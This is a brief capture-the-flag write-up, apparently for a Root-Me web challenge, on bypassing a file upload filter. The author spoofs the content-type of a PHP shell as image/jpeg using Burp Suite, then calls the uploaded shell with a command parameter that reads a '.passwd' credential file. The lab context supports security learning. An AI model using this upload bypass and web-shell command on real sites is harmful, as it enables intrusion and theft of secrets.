Title: Uploading PHP Shell Script as JPEG
Primary topic: Web Exploitation
Secondary topic: File Upload Vulnerability
Tools used: Burp Suite
Keywords: content-type, injection

#context
For this challenge, we use burp to capture the post request sent to the server when trying to upload our php shell script and change the content-type from application/x-php to image/jpeg. This will trick the server into accepting the upload, thinking its a jpg file.

#exploitation
Click icon on our file and, like before, inject our command into the url:
http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/gsejso5erm5ahvm8i561a9tdh7//shell.php?command=cat%20../../../.passwd

#code
cat ../../../.passwd
```
